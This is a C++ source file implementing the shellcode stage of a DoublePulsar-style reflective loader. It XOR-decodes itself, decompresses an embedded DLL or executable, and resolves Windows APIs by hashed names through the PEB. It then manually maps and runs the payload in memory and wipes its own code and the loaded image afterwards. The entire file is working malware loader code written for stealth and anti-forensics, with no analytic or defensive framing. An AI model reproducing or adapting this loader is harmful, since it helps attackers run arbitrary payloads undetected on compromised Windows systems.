// DoublePulsarShellcode.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include "stdio.h"

#include "../Helper/Winapi.h"
#include "../Helper/tools.h"

//Unpacking algorithm
#include "lzo_conf.h"
/* decompression */
LZO_EXTERN(int)
lzo1z_decompress(const lzo_bytep src, lzo_uint  src_len,
    lzo_bytep dst, lzo_uintp dst_len,
    lzo_voidp wrkmem /* NOT USED */);

void shellcode(HMODULE module, ushort sizeShellcode, ushort sizeDllFile, byte ordToCall);

int GetDLL()
{
    SIZE_T start = (SIZE_T)GetDLL + SHELLCODE_XOR_OFFSET;

    while (*((byte*)start) != ('M' ^ KEY_DLL) || *((byte*)start+1) != ('Z' ^ KEY_DLL))
    {
        *((byte*)start) ^= KEY_SHELLCODE;
        start++;
    }

    ushort sizeShellcode = *(ushort*)((SIZE_T)start - 11);
    byte ordToCall = *(byte*)((SIZE_T)start - 9);
    uint compressedSizeDllFile = *(uint*)((SIZE_T)start - 8);
    uint sizeDllFile = *(uint*)((SIZE_T)start - 4);
    // skip flag
    start += 2;

    byte* ptr = (byte*)start;
    for (int i = 0; i < compressedSizeDllFile; i++, ptr++)
    {
        *((byte*)ptr) ^= KEY_DLL;
    }

    // Fetch WinAPI functions
    HMODULE kernel32 = GetModuleBaseAddress(hashKERNEL32);
    typeVirtualAlloc pVirtualAlloc = (typeVirtualAlloc)GetExportAddress(kernel32, hashVirtualAlloc);
    //Allocate the memory
    LPVOID unpacked_mem = pVirtualAlloc(
        0,
        sizeDllFile,
        MEM_COMMIT,
        PAGE_READWRITE);

    //Unpacked data size
    //(in fact, this variable is unnecessary)
    lzo_uint out_len = 0;
    
    //Unpack with LZO algorithm
    lzo1z_decompress(
        (byte*)start,
        compressedSizeDllFile,
        (byte*)unpacked_mem,
        &out_len,
        0);

    mmemset((void*)start, 0, compressedSizeDllFile);

    // load and call the DLL
    shellcode((HMODULE)unpacked_mem, sizeShellcode, sizeDllFile, ordToCall);

    mmemset(GetModuleBaseAddress, 0, (SIZE_T)sizeShellcode - ((SIZE_T)GetModuleBaseAddress - (SIZE_T)GetDLL));
    mmemset((void*)GetDLL, 0, (SIZE_T)GetModuleBaseAddress - (SIZE_T)GetDLL - SHELLCODE_WIPE_OFFSET);

    return 0;
}

HMODULE WINAPI GetModuleBaseAddress(DWORD moduleNameHash)
{
    PEB* pPeb = NULL;
    LIST_ENTRY* pListEntry = NULL;
    LDR_DATA_TABLE_ENTRY* pLdrDataTableEntry = NULL;

    pPeb = GetPEB();

    if (pPeb == NULL)
        return NULL;

    pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pPeb->Ldr->InMemoryOrderModuleList.Flink;
    pListEntry = pPeb->Ldr->InMemoryOrderModuleList.Flink;

    do
    {
        char name[64];
        int i = 0;
        while (pLdrDataTableEntry->FullDllName.Buffer[i] && i < sizeof(name) - 1)
        {
            char c = (char)pLdrDataTableEntry->FullDllName.Buffer[i];
            if (c >= 'a' && c <= 'z')
                c = c - ('a' - 'A');
            name[i] = c;
            i++;
        }
        name[i] = 0;

        if (getHash(name) == moduleNameHash)
            return (HMODULE)pLdrDataTableEntry->Reserved2[0];

        pListEntry = pListEntry->Flink;
        pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)(pListEntry->Flink);

    } while (pListEntry != pPeb->Ldr->InMemoryOrderModuleList.Flink);

    return NULL;
}

FARPROC WINAPI GetExportAddress(HMODULE hMod, DWORD lpProcNameHash)
{
    char* pBaseAddress = (char*)hMod;

    PIMAGE_OPTIONAL_HEADER pOptionalHeader = GetOptionalHeader((HMODULE)pBaseAddress);
    PIMAGE_DATA_DIRECTORY pDataDirectory = (IMAGE_DATA_DIRECTORY*)(&pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (IMAGE_EXPORT_DIRECTORY*)(pBaseAddress + pDataDirectory->VirtualAddress);

    void** ppFunctions = (void**)(pBaseAddress + pExportDirectory->AddressOfFunctions);
    WORD* pOrdinals = (WORD*)(pBaseAddress + pExportDirectory->AddressOfNameOrdinals);
    ULONG* pNames = (ULONG*)(pBaseAddress + pExportDirectory->AddressOfNames);

    void* pAddress = NULL;

    typeLoadLibraryA pLoadLibraryA = NULL;
    //typeGetProcAddressA pGetProcAddress = NULL;

    DWORD i;

    if (!IsOrdinal(lpProcNameHash)) {
        for (i = 0; i < pExportDirectory->NumberOfNames; i++)
        {
            char* szName = (char*)pBaseAddress + (DWORD_PTR)pNames[i];

            if (lpProcNameHash == getHash(szName))
            {
                pAddress = (FARPROC)(pBaseAddress + ((ULONG*)(pBaseAddress + pExportDirectory->AddressOfFunctions))[pOrdinals[i]]);
                break;
            }
        }
    }
    else {
        // by ordinal
        DWORD dwOrdinalBase = pExportDirectory->Base;
        WORD ordinal = LOWORD(lpProcNameHash);

        if (ordinal < dwOrdinalBase || ordinal >= dwOrdinalBase + pExportDirectory->NumberOfFunctions)
            return NULL;

        pAddress = (FARPROC)(pBaseAddress + ((ULONG*)(pBaseAddress + pExportDirectory->AddressOfFunctions))[ordinal - dwOrdinalBase]);
    }

    // Forward?
    if ((SIZE_T*)pAddress >= (SIZE_T*)pExportDirectory && (SIZE_T*)pAddress < (SIZE_T*)pExportDirectory + pDataDirectory->Size)
    {
        char* c;
        char dllName[32];
        HMODULE hForward;

        // pAddress is equal to DLL.FUNC or DLL.#ORDINAL
        c = (char*)pAddress;
        if (!c)
            return NULL;

        pAddress = NULL;

        int i = 0;
        while (c[i] != '.')
        {
            dllName[i] = c[i];
            i++;
        }
        c += i + 1;
        dllName[i++] = '.';
        dllName[i++] = 'd';
        dllName[i++] = 'l';
        dllName[i++] = 'l';
        dllName[i] = 0;

        int num = 0;
        if (*c == '#')
        {
            while (*++c) num = num * 10 + *c - '0';
        }
        else {
            num = getHash(c);
        }

        pLoadLibraryA = (typeLoadLibraryA)GetExportAddress(GetModuleBaseAddress(hashKERNEL32), hashLoadLibraryA);

        if (pLoadLibraryA == NULL)
            return NULL;

        hForward = pLoadLibraryA(dllName);

        if (!hForward)
            return NULL;

        /*pGetProcAddress = (typeGetProcAddressA)GetExportAddress(GetModuleBaseAddress(hashKERNEL32), hashGetProcAddress);

        if (!pGetProcAddress)
            return NULL;*/

        pAddress = GetExportAddress(hForward, num);

    }

    return (FARPROC)pAddress;
}

void shellcode(HMODULE module, ushort sizeShellcode, ushort sizeDllFile, byte ordToCall)
{

    // Get headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS NTheader = GetNTHeaders((HMODULE)module);
    
    // Fetch WinAPI functions
    HMODULE kernel32 = GetModuleBaseAddress(hashKERNEL32);
    typeLoadLibraryA pLoadLibraryA = (typeLoadLibraryA)GetExportAddress(kernel32, hashLoadLibraryA);
    typeVirtualAlloc pVirtualAlloc = (typeVirtualAlloc)GetExportAddress(kernel32, hashVirtualAlloc);
    typeVirtualProtect pVirtualProtect = (typeVirtualProtect)GetExportAddress(kernel32, hashVirtualProtect);
    typeVirtualFree pVirtualFree = (typeVirtualFree)GetExportAddress(kernel32, hashVirtualFree);
    typeRtlAddFunctionTable pRtlAddFunctionTable = (typeRtlAddFunctionTable)GetExportAddress(kernel32, hashRtlAddFunctionTable);

    // Allocate memory for the DLL
    HMODULE imageBase = (HMODULE)pVirtualAlloc(0, NTheader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    // Set mem to zero and copy headers to mem location
    mmemset(imageBase, 0, NTheader->OptionalHeader.SizeOfImage);
    mmemcpy(imageBase, module, dosHeader->e_lfanew + NTheader->OptionalHeader.SizeOfHeaders);
    
    // Get headers from the new location
    NTheader = GetNTHeaders((HMODULE)imageBase);

    // Get first section
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(NTheader);

    // Copy all sections to memory
    for (int i = 0; i < NTheader->FileHeader.NumberOfSections; i++, section++)
    {
        DWORD SectionSize = section->SizeOfRawData;

        if (SectionSize == 0)
        {
            if (section->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)
            {
                SectionSize = NTheader->OptionalHeader.SizeOfInitializedData;
            }
            else if (section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)
            {
                SectionSize = NTheader->OptionalHeader.SizeOfUninitializedData;
            }
            else
            {
                continue;
            }
        }

        void* dst = (void*)((SIZE_T)imageBase + section->VirtualAddress);
        mmemcpy(dst, (byte*)module + section->PointerToRawData, SectionSize);
    }

    // Set DLL shellcode to 0
    mmemset(module, 0, sizeDllFile);
    pVirtualFree(module, 0, MEM_RELEASE);

    // Get relocation detla
    SIZE_T delta = (SIZE_T)((SIZE_T)imageBase - NTheader->OptionalHeader.ImageBase);
    // Delta should always be greater than 0 but check anyway
    if (delta != 0) 
    {
        // Process relocations
        if (NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0)
        {

            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((SIZE_T)imageBase + NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

            while (reloc->SizeOfBlock > 0)
            {
                SIZE_T va = (SIZE_T)imageBase + reloc->VirtualAddress;
                unsigned short* relInfo = (unsigned short*)((byte*)reloc + IMAGE_SIZEOF_BASE_RELOCATION);

                for (DWORD i = 0; i < (reloc->SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / 2; i++, relInfo++)
                {
                    int type = *relInfo >> 12;
                    int offset = *relInfo & 0xfff;

                    switch (type)
                    {
                    case IMAGE_REL_BASED_DIR64:
                    case IMAGE_REL_BASED_HIGHLOW:
                        *((SIZE_T*)(va + offset)) += delta;
                        break;
                    case IMAGE_REL_BASED_HIGH:
                        *((SIZE_T*)(va + offset)) += HIWORD(delta);
                        break;
                    case IMAGE_REL_BASED_LOW:
                        *((SIZE_T*)(va + offset)) += LOWORD(delta);
                        break;
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)(((SIZE_T)reloc) + reloc->SizeOfBlock);
            }
        }
    }

    // Get data directory
    PIMAGE_DATA_DIRECTORY directory = &NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    // Get import directory
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((SIZE_T)imageBase + directory->VirtualAddress);

    // Process imports
    for (; importDesc->Name; importDesc++)
    {
        SIZE_T* thunkRef, * funcRef;
        LPCSTR nameDll = (LPCSTR)((SIZE_T)imageBase + importDesc->Name);

        HMODULE handle = pLoadLibraryA(nameDll);

        if (importDesc->OriginalFirstThunk)
        {
            thunkRef = (SIZE_T*)((SIZE_T)imageBase + (DWORD)importDesc->OriginalFirstThunk);
            funcRef = (SIZE_T*)((SIZE_T)imageBase + (DWORD)importDesc->FirstThunk);
        }
        else
        {
            thunkRef = (SIZE_T*)((SIZE_T)imageBase + (DWORD)importDesc->FirstThunk);
            funcRef = (SIZE_T*)((SIZE_T)imageBase + (DWORD)importDesc->FirstThunk);
        }
        for (; *thunkRef; thunkRef++, funcRef++)
        {
            SIZE_T addr = 0;
            if IMAGE_SNAP_BY_ORDINAL(*thunkRef)
            {
                addr = (SIZE_T)GetExportAddress(handle, (DWORD)IMAGE_ORDINAL(*thunkRef));
            }
            else
            {
                PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)((SIZE_T)imageBase + *thunkRef);
                addr = (SIZE_T)GetExportAddress(handle, getHash(thunkData->Name));
            }
            if (addr)
            {
                if (addr != *funcRef)
                    *funcRef = addr;
            }
        }
    }

    // Get sections
    section = IMAGE_FIRST_SECTION(NTheader);

    // Set memory protection for sections
    for (int i = 0; i < NTheader->FileHeader.NumberOfSections; i++, section++)
    {
        DWORD protect, oldProtect, size;

        size = section->SizeOfRawData;

        protect = PAGE_NOACCESS;
        switch (section->Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE))
        {
        case IMAGE_SCN_MEM_WRITE: protect = PAGE_WRITECOPY; break;
        case IMAGE_SCN_MEM_READ: protect = PAGE_READONLY; break;
        case IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ: protect = PAGE_READWRITE; break;
        case IMAGE_SCN_MEM_EXECUTE: protect = PAGE_EXECUTE; break;
        case IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE: protect = PAGE_EXECUTE_WRITECOPY; break;
        case IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ: protect = PAGE_EXECUTE_READ; break;
        case IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ: protect = PAGE_EXECUTE_READWRITE; break;
        }

        if (section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
            protect |= PAGE_NOCACHE;

        if (size == 0)
        {
            if (section->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)
            {
                size = NTheader->OptionalHeader.SizeOfInitializedData;
            }
            else if (section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)
            {
                size = NTheader->OptionalHeader.SizeOfUninitializedData;
            }
        }

        if (size > 0)
            pVirtualProtect((LPVOID)((SIZE_T)imageBase + section->VirtualAddress), section->Misc.VirtualSize, protect, &oldProtect);
    }

    // Get Exception directory
    directory = &NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    PIMAGE_RUNTIME_FUNCTION_ENTRY ExceptionDirectory = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((SIZE_T)imageBase + directory->VirtualAddress);

    // Add exceptions
    if (ExceptionDirectory)
    {
        CONST DWORD Count = (directory->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) - 1;

        if (Count)
        {
            pRtlAddFunctionTable((PRUNTIME_FUNCTION)ExceptionDirectory, Count, (DWORD64)imageBase);
        }
    }

    // Target DLL and Entrypoint declare
    typeDllEntryProc dllEntryFunc;
    // Target PE and Entrypoint declare
    typemainCRTStartup PeEntryFunc;

    typeCreateThread pCreateThread = (typeCreateThread)GetExportAddress(kernel32, hashCreateThread);
    typeWaitForSingleObject pWaitForSingleObject = (typeWaitForSingleObject)GetExportAddress(kernel32, hashWaitForSingleObject);
    
    if (NTheader->OptionalHeader.AddressOfEntryPoint != 0)
    {
        // Call entrypoint of DLL
        if (NTheader->FileHeader.Characteristics & IMAGE_FILE_DLL)
        {
            dllEntryFunc = (typeDllEntryProc)((SIZE_T)imageBase + (NTheader->OptionalHeader.AddressOfEntryPoint));
            if (dllEntryFunc)
            {
                (*dllEntryFunc)((HINSTANCE)imageBase, DLL_PROCESS_ATTACH, 0);

                typedef VOID(*TestFunction)();
                TestFunction testFunc = (TestFunction)GetExportAddress(imageBase, ordToCall);

                HANDLE hThread = pCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)testFunc, 0, NULL, 0);
			    pWaitForSingleObject(hThread, INFINITE);
            }
        }
        else
        {
            // Call entrypoint of PE
            PeEntryFunc = (typemainCRTStartup)((SIZE_T)imageBase + (NTheader->OptionalHeader.AddressOfEntryPoint));
            if (PeEntryFunc)
            {
                HANDLE hThread = pCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PeEntryFunc, 0, NULL, 0);
			
			    // Wait for the loader to finish executing
			    pWaitForSingleObject(hThread, INFINITE);

			    //(*PeEntryFunc)();
            }
        }
    }

    if (NTheader->FileHeader.Characteristics & IMAGE_FILE_DLL)
    {
        (*dllEntryFunc)((HINSTANCE)imageBase, DLL_PROCESS_DETACH, 0);
    }

    DWORD oldProtect;
    pVirtualProtect(imageBase, NTheader->OptionalHeader.SizeOfImage, PAGE_READWRITE, &oldProtect);
    mmemset(imageBase, 0, NTheader->OptionalHeader.SizeOfImage);
    pVirtualFree(imageBase, 0, MEM_RELEASE);

    return;
}